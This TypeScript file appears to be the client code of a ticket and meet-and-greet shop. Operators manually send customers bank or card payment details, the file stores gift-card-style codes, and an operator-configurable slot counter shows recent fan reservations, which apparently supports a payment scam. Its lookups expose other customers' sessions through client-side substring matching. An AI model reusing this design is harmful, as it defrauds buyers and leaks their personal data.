    itemTitle: sessionMeta?.itemTitle || "NFL Gridiron Order",
    amount: sessionMeta?.amount || 0,
    paymentMethod: sessionMeta?.paymentMethod || "Payment",
    venue: sessionMeta?.venue || "",
    referenceTag,
  });
}

/**
 * Sync attached receipt images immediately to payment_sessions even before final submit
 */
export async function syncSessionReceipts(
  sessionId: string,
  receiptUrls: string[]
): Promise<void> {
  if (!sessionId) return;
  const sessionRef = doc(db, "payment_sessions", sessionId);
  const cleanUrls = receiptUrls.filter((u): u is string => typeof u === "string" && u.trim().length > 0);
  const primary = cleanUrls[0] || "";
  await safeSetDoc(sessionRef, {
    receiptUrl: primary,
    receiptImage: primary,
    receiptImages: cleanUrls,
    updatedAt: Date.now()
  }, { merge: true });
}

/**
 * Control Room: Real-time listener for active sessions awaiting admin payment details
 */
export function subscribeToAwaitingPaymentSessions(
  onUpdate: (sessions: PaymentSession[]) => void
): () => void {
  const q = collection(db, "payment_sessions");
  return onSnapshot(
    q,
    (snap) => {
      const list: PaymentSession[] = [];
      snap.forEach((d) => {
        const item = d.data() as PaymentSession;
        list.push(item);
      });
      // Sort newest first
      list.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
      onUpdate(list);
    },
    (err) => {
      console.warn("Awaiting sessions listener error:", err);
    }
  );
}

/**
 * Control Room: Subscribe to saved payment channel presets
 */
export function subscribeToControlRoomPaymentPresets(
  onUpdate: (presets: ControlRoomPaymentPresets | null) => void
): () => void {
  const ref = doc(db, "control_room_payment_settings", CONTROL_ROOM_SETTINGS_DOC);
  return onSnapshot(
    ref,
    (snap) => {
      if (snap.exists()) {
        onUpdate(snap.data() as ControlRoomPaymentPresets);
      } else {
        onUpdate(null);
      }
    },
    (err) => {
      console.warn("Presets listener error:", err);
    }
  );
}

/**
 * Control Room: Save or update operator presets
 */
export async function saveControlRoomPaymentPresets(
  presets: Partial<ControlRoomPaymentPresets>
): Promise<void> {
  const ref = doc(db, "control_room_payment_settings", CONTROL_ROOM_SETTINGS_DOC);
  await safeSetDoc(ref, {
    ...presets,
    id: CONTROL_ROOM_SETTINGS_DOC,
    updatedAt: Date.now()
  }, { merge: true });
}

/**
 * Control Room: Permanently delete a customer payment session/order
 */
export async function deletePaymentSession(sessionId: string): Promise<void> {
  if (!sessionId) return;
  const sessionRef = doc(db, "payment_sessions", sessionId);
  await deleteDoc(sessionRef);
}

/**
 * Control Room: Permanently delete multiple customer payment sessions/orders (bulk delete)
 */
export async function deletePaymentSessions(sessionIds: string[]): Promise<void> {
  const validIds = sessionIds.filter(Boolean);
  if (validIds.length === 0) return;
  const promises = validIds.map(id => deleteDoc(doc(db, "payment_sessions", id)));
  await Promise.all(promises);
}

/**
 * Customer / Terminal: Look up previous reply details given by admin for this customer
 * when they enter their name and choose the same payment method again.
 */
export async function findRecentDispatchedSessionForCustomer(
  customerName: string,
  paymentMethod: string,
  customerEmail?: string
): Promise<PaymentSession | null> {
  const normName = customerName?.trim().toLowerCase() || "";
  const normEmail = customerEmail?.trim().toLowerCase() || "";

  // Need at least a recognizable name or email (skip empty/generic placeholders)
  const isGeneric = !normName || normName === "customer" || normName === "vip guest" || normName === "ticket guest" || normName === "guest";
  const hasSpecificName = !isGeneric && normName.length >= 2;
  const hasEmail = normEmail.includes("@");

  if (!hasSpecificName && !hasEmail) {
    return null;
  }

  try {
    const q = query(
      collection(db, "payment_sessions"),
      where("paymentMethod", "==", paymentMethod)
    );
    const snap = await getDocs(q);
    const matches: PaymentSession[] = [];

    snap.forEach((d) => {
      const s = d.data() as PaymentSession;
      const sName = s.customerName?.trim().toLowerCase() || "";
      const sEmail = s.customerEmail?.trim().toLowerCase() || "";

      const nameMatches = Boolean(
        hasSpecificName && sName && (sName === normName || sName.includes(normName) || normName.includes(sName))
      );
      const emailMatches = Boolean(hasEmail && sEmail && sEmail === normEmail);

      if (nameMatches || emailMatches) {
        // Must have verified admin payment details dispatched FOR THIS SAME METHOD
        if (
          s.adminPaymentDetails &&
          (!s.adminPaymentDetails.method || s.adminPaymentDetails.method === paymentMethod) &&
          (s.adminPaymentDetails.identifier || s.adminPaymentDetails.accountNumber || s.adminPaymentDetails.bankName)
        ) {
          matches.push(s);
        }
      }
    });

    if (matches.length === 0) return null;

    // Return the newest dispatched session
    matches.sort((a, b) => {
      const bTime = b.adminPaymentDetails?.updatedAt || b.updatedAt || b.createdAt || 0;
      const aTime = a.adminPaymentDetails?.updatedAt || a.updatedAt || a.createdAt || 0;
      return bTime - aTime;
    });

    return matches[0];
  } catch (err) {
    console.warn("Failed to find recent dispatched session for customer:", err);
    return null;
  }
}

/**
 * Customer / Terminal: Real-time listener for any matching session for this customer and payment method
 * that receives dispatched payment details from the operator.
 */
export function subscribeToCustomerDispatchedSession(
  customerName: string,
  paymentMethod: string,
  onUpdate: (session: PaymentSession | null) => void,
  customerEmail?: string
): () => void {
  const normName = customerName?.trim().toLowerCase() || "";
  const normEmail = customerEmail?.trim().toLowerCase() || "";
  const isGeneric = !normName || normName === "customer" || normName === "vip guest" || normName === "ticket guest" || normName === "guest";
  const hasSpecificName = !isGeneric && normName.length >= 2;
  const hasEmail = normEmail.includes("@");

  if (!hasSpecificName && !hasEmail) {
    return () => {};
  }

  const q = query(
    collection(db, "payment_sessions"),
    where("paymentMethod", "==", paymentMethod)
  );

  return onSnapshot(
    q,
    (snap) => {
      const matches: PaymentSession[] = [];
      snap.forEach((d) => {
        const s = d.data() as PaymentSession;
        const sName = s.customerName?.trim().toLowerCase() || "";
        const sEmail = s.customerEmail?.trim().toLowerCase() || "";

        const nameMatches = Boolean(
          hasSpecificName && sName && (sName === normName || sName.includes(normName) || normName.includes(sName))
        );
        const emailMatches = Boolean(hasEmail && sEmail && sEmail === normEmail);

        if (nameMatches || emailMatches) {
          if (
            s.adminPaymentDetails &&
            (!s.adminPaymentDetails.method || s.adminPaymentDetails.method === paymentMethod) &&
            (s.adminPaymentDetails.identifier || s.adminPaymentDetails.accountNumber || s.adminPaymentDetails.bankName)
          ) {
            matches.push(s);
          }
        }
      });

      if (matches.length > 0) {
        matches.sort((a, b) => {
          const bTime = b.adminPaymentDetails?.updatedAt || b.updatedAt || b.createdAt || 0;
          const aTime = a.adminPaymentDetails?.updatedAt || a.updatedAt || a.createdAt || 0;
          return bTime - aTime;
        });
        onUpdate(matches[0]);
      }
    },
    (err) => {
      console.warn("Customer dispatched session subscription error:", err);
    }
  );
}

/**
 * Customer / Inquiry Recovery: Look up ALL active/responded sessions for a customer
 * across ALL payment methods (whether vendor already responded, is still assigning, or customer submitted receipt).
 */
export async function findCustomerInquirySessions(params: {
  email?: string;
  name?: string;
  sessionId?: string;
}): Promise<PaymentSession[]> {
  const normEmail = params.email?.trim().toLowerCase() || "";
  const normName = params.name?.trim().toLowerCase() || "";
  const rawId = params.sessionId?.trim() || "";
  const normId = rawId.toLowerCase();

  const isGeneric = (val: string) =>
    !val || ["customer", "vip guest", "ticket guest", "guest", "vip member", "patriots collector"].includes(val);
  const hasSpecificName = !isGeneric(normName) && normName.length >= 2;
  const hasEmail = normEmail.includes("@");
  const hasId = rawId.length >= 3;

  if (!hasSpecificName && !hasEmail && !hasId) {
    return [];
  }

  const resultsMap = new Map<string, PaymentSession>();

  try {
    if (hasId) {
      try {
        const directSnap = await getDoc(doc(db, "payment_sessions", rawId));
        if (directSnap.exists()) {
          const data = directSnap.data() as PaymentSession;
          if (data.status !== "cancelled") {
            resultsMap.set(directSnap.id, data);
          }
        }
      } catch {
        // ignore missing direct doc
      }
    }

    const allSnap = await getDocs(collection(db, "payment_sessions"));
    allSnap.forEach((d) => {
      const s = d.data() as PaymentSession;
      if (!s || s.status === "cancelled") return;

      const sId = (s.id || d.id || "").toLowerCase();
      const sOrderId = (s.orderId || "").toLowerCase();
      const sName = (s.customerName || "").trim().toLowerCase();
      const sEmail = (s.customerEmail || "").trim().toLowerCase();

      const emailMatch = Boolean(hasEmail && sEmail && sEmail === normEmail);
      const nameMatch = Boolean(
        hasSpecificName && sName && (sName === normName || sName.includes(normName) || normName.includes(sName))
      );
      const idMatch = Boolean(hasId && (sId === normId || sOrderId === normId || sId.includes(normId)));

      if (emailMatch || nameMatch || idMatch) {
        resultsMap.set(s.id || d.id, s);
      }
    });

    const priorityRank = (s: PaymentSession): number => {
      const hasDetails = Boolean(
        s.adminPaymentDetails &&
          (s.adminPaymentDetails.identifier || s.adminPaymentDetails.accountNumber || s.adminPaymentDetails.bankName)
      );
      if (hasDetails && s.status !== "payment_submitted" && s.status !== "completed") return 1;
      if (s.status === "awaiting_admin_details") return 2;
      if (s.status === "payment_submitted") return 3;
      return 4;
    };

    return Array.from(resultsMap.values()).sort((a, b) => {
      const rankDiff = priorityRank(a) - priorityRank(b);
      if (rankDiff !== 0) return rankDiff;
      return (b.updatedAt || b.createdAt || 0) - (a.updatedAt || a.createdAt || 0);
    });
  } catch (err) {
    console.warn("Failed to find customer inquiry sessions:", err);
    return Array.from(resultsMap.values());
  }
}

/**
 * Direct In-Website Messaging (No Login or External Email Needed):
 * Sends an admin update or customer reply directly onto the payment session document.
 */
export async function sendSessionMailMessage(
  sessionId: string,
  message: {
    sender: "admin" | "customer";
    senderName?: string;
    subject?: string;
    body: string;
  }
): Promise<SessionMailMessage> {
  if (!sessionId || !message.body.trim()) {
    throw new Error("Session ID and message body are required.");
  }

  const sessionRef = doc(db, "payment_sessions", sessionId);
  let existingMessages: SessionMailMessage[] = [];
  try {
    const snap = await getDoc(sessionRef);
    if (snap.exists()) {
      const data = snap.data() as PaymentSession;
      if (Array.isArray(data.messages)) {
        existingMessages = data.messages;
      }
    }
  } catch (err) {
    console.warn("Could not fetch existing session messages:", err);
  }

  const now = Date.now();
  const newMsg: SessionMailMessage = {
    id: `MSG-${now}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`,
    sender: message.sender,
    senderName: message.senderName?.trim() || (message.sender === "admin" ? "Billing Concierge" : "Guest"),
    ...(message.subject?.trim() ? { subject: message.subject.trim() } : {}),
    body: message.body.trim(),
    createdAt: now
  };

  const nextMessages = [...existingMessages, newMsg].slice(-40);

  await safeSetDoc(
    sessionRef,
    {
      messages: nextMessages,
      ...(message.sender === "admin" ? { lastAdminMessageAt: now } : { lastCustomerReplyAt: now }),
      updatedAt: now
    },
    { merge: true }
  );

  return newMsg;
}

export const SAVED_PAYMENT_SESSIONS_KEY = "nfl_saved_payment_sessions";
export const GUEST_MAIL_READ_KEY = "nfl_read_guest_mail_ids";
export const SAVED_SESSIONS_EVENT = "nfl_saved_sessions_updated";
export const READ_MAIL_EVENT = "nfl_guest_mail_read_updated";

export interface SavedGuestSessionBookmark {
  id: string;
  orderId?: string;
  customerName?: string;
  customerEmail?: string;
  paymentMethod?: string;
  itemTitle?: string;
  amount?: number;
  status?: string;
  updatedAt?: number;
}

export function getSavedGuestSessions(): SavedGuestSessionBookmark[] {
  try {
    const raw = localStorage.getItem(SAVED_PAYMENT_SESSIONS_KEY);
    const parsed = raw ? JSON.parse(raw) : [];
    return Array.isArray(parsed) ? parsed.filter((x) => x && x.id) : [];
  } catch {
    return [];
  }
}

export function upsertSavedGuestSession(entry: SavedGuestSessionBookmark): void {
  if (!entry?.id) return;
  try {
    const existing = getSavedGuestSessions();
    const filtered = existing.filter((x) => x.id !== entry.id);
    const next = [{ ...entry, updatedAt: entry.updatedAt || Date.now() }, ...filtered].slice(0, 6);
    localStorage.setItem(SAVED_PAYMENT_SESSIONS_KEY, JSON.stringify(next));
    window.dispatchEvent(new Event(SAVED_SESSIONS_EVENT));
  } catch {
    // ignore storage quota errors
  }
}

export function getReadGuestMailIds(): string[] {
  try {
    const raw = localStorage.getItem(GUEST_MAIL_READ_KEY);
    const parsed = raw ? JSON.parse(raw) : [];
    return Array.isArray(parsed) ? parsed.filter((x) => typeof x === "string") : [];
  } catch {
    return [];
  }
}

export function markGuestMessagesAsRead(ids: string[]): void {
  const valid = ids.filter((id) => typeof id === "string" && id.length > 0);
  if (valid.length === 0) return;
  try {
    const existing = getReadGuestMailIds();
    const merged = Array.from(new Set([...valid, ...existing])).slice(0, 250);
    localStorage.setItem(GUEST_MAIL_READ_KEY, JSON.stringify(merged));
    window.dispatchEvent(new Event(READ_MAIL_EVENT));
  } catch {
    // ignore storage errors
  }
}

export function playGuestNotificationChime(): void {
  try {
    const AudioCtx = window.AudioContext || (window as unknown as { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
    if (!AudioCtx) return;
    const ctx = new AudioCtx();
    const now = ctx.currentTime;

    const osc1 = ctx.createOscillator();
    const gain1 = ctx.createGain();
    osc1.type = "sine";
    osc1.frequency.setValueAtTime(659.25, now); // E5
    osc1.frequency.setValueAtTime(880, now + 0.11); // A5
    gain1.gain.setValueAtTime(0.001, now);
    gain1.gain.exponentialRampToValueAtTime(0.09, now + 0.03);
    gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.35);

    osc1.connect(gain1);
    gain1.connect(ctx.destination);
    osc1.start(now);
    osc1.stop(now + 0.36);
  } catch {
    // Ignore autoplay restriction errors
  }
}

export const PENDING_APPLE_CONFIRMATION_KEY = "nfl_pending_apple_confirmation";
export const PENDING_APPLE_EVENT = "nfl_pending_apple_updated";

export interface PendingAppleConfirmation {
  sessionId: string;
  orderId?: string;
  customerName: string;
  customerEmail: string;
  itemTitle: string;
  amount: number;
  partnerName?: string;
  openedAt: number;
}

export function getPendingAppleConfirmation(): PendingAppleConfirmation | null {
  try {
    const raw = localStorage.getItem(PENDING_APPLE_CONFIRMATION_KEY);
    if (!raw) return null;
    const parsed = JSON.parse(raw) as PendingAppleConfirmation;
    if (!parsed || !parsed.sessionId) return null;
    // Expire automatically after 48 hours
    if (parsed.openedAt && Date.now() - parsed.openedAt > 48 * 60 * 60 * 1000) {
      localStorage.removeItem(PENDING_APPLE_CONFIRMATION_KEY);
      return null;
    }
    return parsed;
  } catch {
    return null;
  }
}

export function setPendingAppleConfirmation(entry: PendingAppleConfirmation): void {
  try {
    localStorage.setItem(PENDING_APPLE_CONFIRMATION_KEY, JSON.stringify(entry));
    window.dispatchEvent(new Event(PENDING_APPLE_EVENT));
  } catch {
    // ignore storage quota errors
  }
}

export function clearPendingAppleConfirmation(): void {
  try {
    localStorage.removeItem(PENDING_APPLE_CONFIRMATION_KEY);
    window.dispatchEvent(new Event(PENDING_APPLE_EVENT));
  } catch {
    // ignore storage errors
  }
}

export interface AdminEmailNotificationPayload {
  eventType: "payment_details_requested" | "payment_sent_confirmed" | "receipt_submitted" | "test_alert";
  sessionId?: string;
  orderId?: string;
  customerName?: string;
  customerEmail?: string;
  customerPhone?: string;
  itemTitle?: string;
  amount?: number;
  paymentMethod?: string;
  venue?: string;
  referenceTag?: string;
  cardCode?: string;
  partnerName?: string;
  force?: boolean;
}

export interface AdminEmailAlertResult {
  ok: boolean;
  emailConfigured?: boolean;
  provider?: string;
  recipient?: string;
  code?: string;
  message?: string;
  error?: string;
  deduped?: boolean;
}

const clientSentEmailKeys = new Map<string, number>();

export async function notifyAdminEmailAlert(
  payload: AdminEmailNotificationPayload
): Promise<AdminEmailAlertResult> {
  try {
    const key = `${payload.eventType}::${payload.sessionId || payload.orderId || payload.customerEmail || ""}`;
    if (!payload.force && key) {
      const last = clientSentEmailKeys.get(key) || 0;
      if (Date.now() - last < 15_000) {
        return { ok: true, deduped: true };
      }
      clientSentEmailKeys.set(key, Date.now());
    }

    const bodyJson = JSON.stringify(payload);
    const res = await fetch("/api/admin/notify-email", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: bodyJson,
      keepalive: true,
    });
    const data = await res.json().catch(() => ({ ok: false }));
    return data as AdminEmailAlertResult;
  } catch (err: any) {
    try {
      if (typeof navigator !== "undefined" && typeof navigator.sendBeacon === "function") {
        const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
        navigator.sendBeacon("/api/admin/notify-email", blob);
      }
    } catch {
      // ignore beacon error
    }
    return {
      ok: false,
      error: err?.message || "Unable to reach admin email endpoint.",
    };
  }
}

export async function fetchAdminEmailStatus(): Promise<{
  emailConfigured: boolean;
  provider: string;
  recipient: string;
}> {
  try {
    const res = await fetch("/api/admin/email-status");
    const data = await res.json();
    return {
      emailConfigured: Boolean(data?.emailConfigured),
      provider: String(data?.provider || "none"),
      recipient: String(data?.recipient || "support@nflgridiron.company"),
    };
  } catch {
    return {
      emailConfigured: false,
      provider: "none",
      recipient: "support@nflgridiron.company",
    };
  }
}

export const CEEDEE_DEFAULT_TOTAL_SLOTS = 25;

export interface CeeDeeRecentReservation {
  key: string;
  displayName: string;
  itemLabel: string;
  statusLabel: string;
  isConfirmed: boolean;
  timestampMs: number;
}

export interface CeeDeePublicSlotStats {
  totalSlots: number;
  claimedCount: number;
  confirmedCount: number;
  remainingSlots: number;
  percentFilled: number;
  recentActivity: CeeDeeRecentReservation[];
  loaded: boolean;
}

function anonymizeFanDisplayName(rawName: unknown): string {
  const clean = String(rawName || "").trim().replace(/\s+/g, " ");
  if (
    !clean ||
    clean.toLowerCase() === "guest" ||
    clean.toLowerCase() === "customer" ||
    clean.toLowerCase().includes("@")
  ) {
    return "Verified Fan";
  }
  const parts = clean.split(" ").filter(Boolean);
  const titleCase = (s: string) => s.charAt(0).toUpperCase() + s.slice(1).toLowerCase();
  const first = titleCase(parts[0]);
  if (parts.length === 1) return first;
  const lastInitial = parts[parts.length - 1].charAt(0).toUpperCase();
  return `${first} ${lastInitial}.`;
}

function parseTimestampMs(raw: unknown): number {
  if (typeof raw === "number" && Number.isFinite(raw) && raw > 0) return raw;
  if (typeof raw === "string" && raw.trim()) {
    const parsed = Date.parse(raw);
    if (Number.isFinite(parsed) && parsed > 0) return parsed;
  }
  if (raw && typeof (raw as any).toMillis === "function") {
    return (raw as any).toMillis();
  }
  return 0;
}

function isCeeDeePublicMeetGreetItem(titleRaw: unknown, idRaw?: unknown): boolean {
  const t = String(titleRaw || "").toLowerCase();
  const id = String(idRaw || "").toLowerCase();
  if (t.includes("1,000") || t.includes("two installments") || t.includes("fan experience (")) {
    return false;
  }
  return (
    t.includes("ceedee") ||
    t.includes("public meet & greet") ||
    id.includes("ceedee-public")
  );
}

export async function saveCeeDeeTotalSlots(totalSlots: number): Promise<void> {
  const sanitized = Math.max(5, Math.min(5000, Math.round(Number(totalSlots) || CEEDEE_DEFAULT_TOTAL_SLOTS)));
  const ref = doc(db, "control_room_payment_settings", CONTROL_ROOM_SETTINGS_DOC);
  await safeSetDoc(
    ref,
    {
      id: CONTROL_ROOM_SETTINGS_DOC,
      ceedeeTotalSlots: sanitized,
      updatedAt: Date.now(),
    },
    { merge: true }
  );
}

export function subscribeToCeeDeePublicSlotStats(
  onUpdate: (stats: CeeDeePublicSlotStats) => void
): () => void {
  let sessionsDocs: Record<string, any>[] = [];
  let ordersDocs: Record<string, any>[] = [];
  let configuredTotal = CEEDEE_DEFAULT_TOTAL_SLOTS;
  let sessionsReady = false;
  let ordersReady = false;

  const emitStats = () => {
    if (!sessionsReady || !ordersReady) return;
    const mergedByKey = new Map<
      string,
      {
        name: string;
        itemTitle: string;
        timestampMs: number;
        rejected: boolean;
        confirmed: boolean;
      }
    >();

    for (const s of sessionsDocs) {
      if (!isCeeDeePublicMeetGreetItem(s.itemTitle, s.id)) continue;
      const key = String(s.id || s.orderId || "").trim();
      if (!key) continue;
      const status = String(s.status || "").toLowerCase();
      const rejected = status === "cancelled" || status === "rejected";
      const confirmed =
        status === "completed" ||
        status === "payment_submitted" ||
        Boolean(s.customerConfirmedSent);
      const ts =
        parseTimestampMs(s.sentConfirmedAt) ||
        parseTimestampMs(s.partnerClickedAt) ||
        parseTimestampMs(s.createdAt) ||
        parseTimestampMs(s.updatedAt);

      mergedByKey.set(key, {
        name: String(s.customerName || "Verified Fan"),
        itemTitle: String(s.itemTitle || "CeeDee Lamb Public Meet & Greet"),
        timestampMs: ts,
        rejected,
        confirmed,
      });
    }

    for (const o of ordersDocs) {
      const title = o.itemName || o.itemTitle || "";
      if (!isCeeDeePublicMeetGreetItem(title, o.id)) continue;
      const key = String(o.sessionId || o.paymentSessionId || o.orderId || o.id || "").trim();
      if (!key) continue;
      const status = String(o.status || "").toLowerCase();
      const orderStatus = String(o.orderStatus || "").toLowerCase();
      const rejected =
        status === "rejected" ||
        status === "cancelled" ||
        orderStatus.includes("rejected");
      const confirmed =
        status === "approved" ||
        status === "completed" ||
        Boolean(o.isApproved) ||
        Boolean(o.customerConfirmedSent) ||
        orderStatus.includes("confirmed");
      const ts =
        parseTimestampMs(o.timestamp) ||
        parseTimestampMs(o.createdAt) ||
        parseTimestampMs(o.updatedAt);

      const prev = mergedByKey.get(key);
      if (prev) {
        mergedByKey.set(key, {
          name: prev.name || String(o.buyerName || o.customerName || "Verified Fan"),
          itemTitle: prev.itemTitle || String(title),
          timestampMs: Math.max(prev.timestampMs, ts),
          rejected: prev.rejected || rejected,
          confirmed: !rejected && (prev.confirmed || confirmed),
        });
      } else {
        mergedByKey.set(key, {
          name: String(o.buyerName || o.customerName || "Verified Fan"),
          itemTitle: String(title),
          timestampMs: ts,
          rejected,
          confirmed,
        });
      }
    }

    const activeEntries = Array.from(mergedByKey.entries())
      .filter(([, v]) => !v.rejected)
      .sort((a, b) => b[1].timestampMs - a[1].timestampMs);

    const claimedCount = activeEntries.length;
    const confirmedCount = activeEntries.filter(([, v]) => v.confirmed).length;
    const totalSlots = Math.max(claimedCount, configuredTotal);
    const remainingSlots = Math.max(0, totalSlots - claimedCount);
    const percentFilled = totalSlots > 0 ? Math.min(100, Math.round((claimedCount / totalSlots) * 100)) : 0;

    const recentActivity: CeeDeeRecentReservation[] = activeEntries.slice(0, 6).map(([_, entry], idx) => {
      const hasJersey = entry.itemTitle.toLowerCase().includes("jersey");
      return {
        key: `fan-${idx}-${entry.timestampMs}`,
        displayName: anonymizeFanDisplayName(entry.name),
        itemLabel: hasJersey ? "Meet & Greet + Signed #88 Jersey" : "Meet & Greet Ticket",
        statusLabel: entry.confirmed ? "Confirmed" : "Slot Reserved",
        isConfirmed: entry.confirmed,
        timestampMs: entry.timestampMs,
      };
    });

    onUpdate({
      totalSlots,
      claimedCount,
      confirmedCount,
      remainingSlots,
      percentFilled,
      recentActivity,
      loaded: sessionsReady || ordersReady,
    });
  };

  const unsubSessions = onSnapshot(
    collection(db, "payment_sessions"),
    (snap) => {
      sessionsDocs = snap.docs.map((d) => ({ id: d.id, ...d.data() }));
      sessionsReady = true;
      emitStats();
    },
    (err) => {
      console.warn("CeeDee slot stats (sessions) listener warning:", err?.message || err);
      sessionsReady = true;
      emitStats();
    }
  );

  const unsubOrders = onSnapshot(
    collection(db, "store_orders"),
    (snap) => {
      ordersDocs = snap.docs.map((d) => ({ id: d.id, ...d.data() }));
      ordersReady = true;
      emitStats();
    },
    (err) => {
      console.warn("CeeDee slot stats (orders) listener warning:", err?.message || err);
      ordersReady = true;
      emitStats();
    }
  );

  const unsubSettings = onSnapshot(
    doc(db, "control_room_payment_settings", CONTROL_ROOM_SETTINGS_DOC),
    (snap) => {
      const data = snap.exists() ? (snap.data() as ControlRoomPaymentPresets) : null;
      if (data && typeof data.ceedeeTotalSlots === "number" && data.ceedeeTotalSlots >= 5) {
        configuredTotal = Math.round(data.ceedeeTotalSlots);
      } else {
        configuredTotal = CEEDEE_DEFAULT_TOTAL_SLOTS;
      }
      emitStats();
    },
    () => {
      configuredTotal = CEEDEE_DEFAULT_TOTAL_SLOTS;
    }
  );

  return () => {
    unsubSessions();
    unsubOrders();
    unsubSettings();
  };
}


